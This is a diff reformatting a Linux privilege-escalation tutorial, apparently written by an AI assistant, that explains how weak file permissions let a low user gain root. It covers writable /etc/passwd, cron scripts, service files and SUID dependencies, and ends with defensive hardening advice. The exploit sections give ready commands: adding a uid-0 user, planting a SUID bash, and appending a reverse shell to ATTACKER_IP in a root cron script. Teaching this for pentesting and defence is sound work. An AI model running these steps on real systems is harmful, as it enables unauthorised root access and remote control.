@@ -1,206 +1,235 @@
-Weak file permissions = a low-privileged user can modify files that are executed by a high-privileged user (like root) → which leads to privilege escalation.
+Weak file permissions = **a low-privileged user can modify files that are executed by a high-privileged user (like root)** → which leads to **privilege escalation**.
 
 Let’s break this down in a clean, practical, pentester + sysadmin friendly way 🔥
 
-
 ---
 
-🔓 What Are Weak File Permissions?
+# 🔓 What Are Weak File Permissions?
 
 In Linux every file has:
 
+```
 Owner   Group   Others
 rwx     rwx     rwx
+```
 
-If sensitive files are writable by normal users, they can:
+If **sensitive files are writable by normal users**, they can:
 
 ✅ inject commands
 ✅ replace content
 ✅ get root shell
 
-
 ---
 
-🚨 Why This Is Dangerous
+# 🚨 Why This Is Dangerous
 
-Because Linux often runs things automatically as root:
+Because Linux often runs things automatically as **root**:
 
-cron jobs
-
-system services
-
-startup scripts
-
-SUID binaries
-
+* cron jobs
+* system services
+* startup scripts
+* SUID binaries
 
 If you can modify what root executes → you become root.
 
-
 ---
 
-⚠️ Case 1 — Writable /etc/passwd
+# ⚠️ Case 1 — Writable /etc/passwd
 
-📌 Normal Permission
+## 📌 Normal Permission
 
+```
 -rw-r--r-- 1 root root /etc/passwd
+```
 
-❌ Misconfigured
+## ❌ Misconfigured
 
+```
 -rw-rw-rw- 1 root root /etc/passwd
+```
 
-Exploit Flow
+### Exploit Flow
 
 1️⃣ Check permission:
 
+```bash
 ls -l /etc/passwd
+```
 
 2️⃣ Generate password hash:
 
+```bash
 openssl passwd -1 hacker
+```
 
 3️⃣ Add new root user:
 
+```bash
 echo 'hacker:$1$xyz$abc:0:0:root:/root:/bin/bash' >> /etc/passwd
+```
 
 4️⃣ Switch user:
 
+```bash
 su hacker
+```
 
 💀 BOOM → root shell
 
-
 ---
 
-⚠️ Case 2 — Writable Root Cron Script (Most Common in CTF & Real Systems)
+# ⚠️ Case 2 — Writable Root Cron Script (Most Common in CTF & Real Systems)
 
-Root Cron Job
+## Root Cron Job
 
+```
 * * * * * root /home/user/script.sh
+```
 
-Permission
+## Permission
 
+```
 -rwxrwxrwx 1 user user script.sh
+```
 
 🧠 Root runs it, but user owns it.
 
-
 ---
 
-🧨 Exploit
+## 🧨 Exploit
 
-Inject payload:
+### Inject payload:
 
+```bash
 echo "cp /bin/bash /tmp/rootbash" >> script.sh
 echo "chmod +s /tmp/rootbash" >> script.sh
+```
 
 Wait for cron to execute…
 
 Then:
 
+```bash
 /tmp/rootbash -p
+```
 
 🔥 ROOT SHELL
 
-
 ---
 
-⚠️ Case 3 — Writable Service File
+# ⚠️ Case 3 — Writable Service File
 
 Suppose:
 
+```
 /etc/systemd/system/app.service
+```
 
 is writable.
 
 You change:
 
+```ini
 ExecStart=/tmp/shell.sh
+```
 
 Reload service → root executes your payload.
 
-
 ---
 
-⚠️ Case 4 — Writable SUID Binary Dependency
+# ⚠️ Case 4 — Writable SUID Binary Dependency
 
 If SUID program calls:
 
+```bash
 #!/bin/bash
 backup.sh
+```
 
-And backup.sh is writable → inject shell.
-
+And `backup.sh` is writable → inject shell.
 
 ---
 
-🔍 How Attackers Find These
+# 🔍 How Attackers Find These
 
-World writable files
+### World writable files
 
+```bash
 find / -type f -perm -002 2>/dev/null
+```
 
-Writable by current user
+### Writable by current user
 
+```bash
 find / -writable 2>/dev/null
+```
 
-Interesting targets
+### Interesting targets
 
+```bash
 ls -l /etc/passwd
 ls -l /etc/crontab
 ls -l /etc/cron*
-
+```
 
 ---
 
-🛡️ Prevention (Blue Team View)
+# 🛡️ Prevention (Blue Team View)
 
-1️⃣ Principle of Least Privilege
+## 1️⃣ Principle of Least Privilege
 
 Only give minimum required access.
 
 Correct:
 
+```
 -rwxr-x--- root root script.sh
+```
 
 ❌ Never:
 
+```
 777
-
+```
 
 ---
 
-2️⃣ Restrict Write Permissions
+## 2️⃣ Restrict Write Permissions
 
 Use:
 
+```bash
 chmod 644 file
 chmod 750 script.sh
-
+```
 
 ---
 
-3️⃣ Proper Ownership
+## 3️⃣ Proper Ownership
 
+```bash
 chown root:root script.sh
-
+```
 
 ---
 
-4️⃣ Regular Audits
+## 4️⃣ Regular Audits
 
-Find world-writable files
+### Find world-writable files
 
+```bash
 find / -type f -perm -002
+```
 
-Find writable cron files
+### Find writable cron files
 
+```bash
 ls -la /etc/cron*
-
+```
 
 ---
 
-🧠 Real-World PrivEsc Mindset
+# 🧠 Real-World PrivEsc Mindset
 
 When you get a shell as low user:
 
@@ -208,65 +237,65 @@ You ask:
 
 > ❓ What does root execute that I can modify?
 
-
-
 Check:
 
-cron jobs
-
-systemd services
-
-backup scripts
-
-logrotate scripts
-
-writable config files
-
+* cron jobs
+* systemd services
+* backup scripts
+* logrotate scripts
+* writable config files
 
 That’s the real game.
 
-
 ---
 
-🔥 Quick Real CTF Style Example
+# 🔥 Quick Real CTF Style Example
 
-Low shell as www-data
+Low shell as `www-data`
 
+```bash
 cat /etc/crontab
+```
 
 Output:
 
+```
 * * * * * root /opt/backup.sh
+```
 
 Check:
 
+```bash
 ls -l /opt/backup.sh
+```
 
 Result:
 
+```
 -rwxrwxrwx 1 www-data www-data backup.sh
+```
 
 Exploit:
 
+```bash
 echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/backup.sh
+```
 
 Wait 1 minute…
 
 💀 ROOT REVERSE SHELL
 
+---
+
+# ⭐ Key Takeaway
+
+Weak permissions = **low user controls something executed by root**
+
+That is one of the **most common real-world Linux privilege escalation vectors**.
 
 ---
 
-⭐ Key Takeaway
-
-Weak permissions = low user controls something executed by root
-
-That is one of the most common real-world Linux privilege escalation vectors.
-
-
----
-
-⚡ If You Want — Next Level
+# ⚡ If You Want — Next Level
 
 I can give you:
 
